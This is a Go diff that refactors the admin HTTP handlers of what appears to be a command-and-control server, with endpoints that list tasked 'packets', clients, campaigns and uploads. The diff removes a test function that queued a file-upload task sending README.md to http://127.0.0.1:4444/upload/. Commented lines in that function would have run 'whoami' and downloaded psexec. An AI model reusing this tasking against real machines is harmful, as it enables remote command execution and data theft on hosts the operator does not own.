@@ -11,8 +11,8 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
-func (s *Server) adminListPackets(rw http.ResponseWriter, r *http.Request) {
-	packetInfos := s.packetDb.getAll()
+func (s *HttpServer) adminListPackets(rw http.ResponseWriter, r *http.Request) {
+	packetInfos := s.serverManager.AdminGetAllPacket()
 	json, err := json.Marshal(packetInfos)
 	if err != nil {
 		log.Error("Could not JSON marshal")
@@ -21,19 +21,15 @@ func (s *Server) adminListPackets(rw http.ResponseWriter, r *http.Request) {
 	fmt.Fprint(rw, string(json))
 }
 
-func (s *Server) adminListPacketsComputerId(rw http.ResponseWriter, r *http.Request) {
+func (s *HttpServer) adminListPacketsComputerId(rw http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	computerId := vars["computerId"]
 
-	var filteredPackets []PacketInfo = make([]PacketInfo, 0)
-	packetInfos := s.packetDb.getAll()
-	for _, packetInfo := range packetInfos {
-		if packetInfo.Packet.ComputerId == computerId {
-			filteredPackets = append(filteredPackets, packetInfo)
-		}
+	if computerId == "" {
+		return
 	}
-
-	json, err := json.Marshal(filteredPackets)
+	packetInfos := s.serverManager.AdminGetPacketById(computerId)
+	json, err := json.Marshal(packetInfos)
 	if err != nil {
 		log.Error("Could not JSON marshal")
 		return
@@ -41,8 +37,8 @@ func (s *Server) adminListPacketsComputerId(rw http.ResponseWriter, r *http.Requ
 	fmt.Fprint(rw, string(json))
 }
 
-func (s *Server) adminListClients(rw http.ResponseWriter, r *http.Request) {
-	hostList := s.clientInfoDb.getAsList()
+func (s *HttpServer) adminListClients(rw http.ResponseWriter, r *http.Request) {
+	hostList := s.serverManager.AdminGetAllClients()
 	json, err := json.Marshal(hostList)
 	if err != nil {
 		log.Error("Could not JSON marshal")
@@ -51,29 +47,7 @@ func (s *Server) adminListClients(rw http.ResponseWriter, r *http.Request) {
 	fmt.Fprint(rw, string(json))
 }
 
-func (s *Server) adminAddTestPacket(rw http.ResponseWriter, r *http.Request) {
-	arguments := make(model.PacketArgument)
-	//arguments["executable"] = "packet"
-	//arguments["arg1"] = "/C"
-	//arguments["arg2"] = "whoami"
-
-	//arguments["remoteurl"] = "http://127.0.0.1:4444/psexec.txt"
-	//arguments["destination"] = "psexec.txt"
-
-	packetId := s.getRandomPacketId()
-
-	arguments["remoteurl"] = "http://127.0.0.1:4444/upload/" + packetId
-	arguments["source"] = "README.md"
-
-	response := make(model.PacketResponse)
-	packet := model.NewPacket("fileupload", "0", packetId, arguments, response)
-	packetInfo := NewPacketInfo(packet, STATE_RECORDED)
-	s.packetDb.add(packetInfo)
-
-	s.adminWebSocket.broadcastPacket(packetInfo)
-}
-
-func (s *Server) adminAddPacket(rw http.ResponseWriter, r *http.Request) {
+func (s *HttpServer) adminAddPacket(rw http.ResponseWriter, r *http.Request) {
 	reqBody, err := ioutil.ReadAll(r.Body)
 	if err != nil {
 		log.Error("Could not read body")
@@ -103,13 +77,10 @@ func (s *Server) adminAddPacket(rw http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	packetInfo := NewPacketInfo(packet, STATE_RECORDED)
-
-	// Send it through the pipeline
-	s.AddNewPacket(packetInfo)
+	s.serverManager.AdminAddNewPacket(packet)
 }
 
-func (s *Server) adminGetCampaign(rw http.ResponseWriter, r *http.Request) {
+func (s *HttpServer) adminGetCampaign(rw http.ResponseWriter, r *http.Request) {
 	json, err := json.Marshal(s.Campaign)
 	if err != nil {
 		log.Error("Could not JSON marshal")
@@ -118,7 +89,7 @@ func (s *Server) adminGetCampaign(rw http.ResponseWriter, r *http.Request) {
 	fmt.Fprint(rw, string(json))
 }
 
-func (s *Server) adminGetUploads(rw http.ResponseWriter, r *http.Request) {
+func (s *HttpServer) adminGetUploads(rw http.ResponseWriter, r *http.Request) {
 	dirList, err := model.ListDirectory("./upload")
 	if err != nil {
 		log.Error("Could not: ", err)
@@ -132,7 +103,7 @@ func (s *Server) adminGetUploads(rw http.ResponseWriter, r *http.Request) {
 	fmt.Fprint(rw, string(json))
 }
 
-func (s *Server) adminGetStatics(rw http.ResponseWriter, r *http.Request) {
+func (s *HttpServer) adminGetStatics(rw http.ResponseWriter, r *http.Request) {
 	dirList, err := model.ListDirectory("./static")
 	if err != nil {
 		log.Error("Could not: ", err)
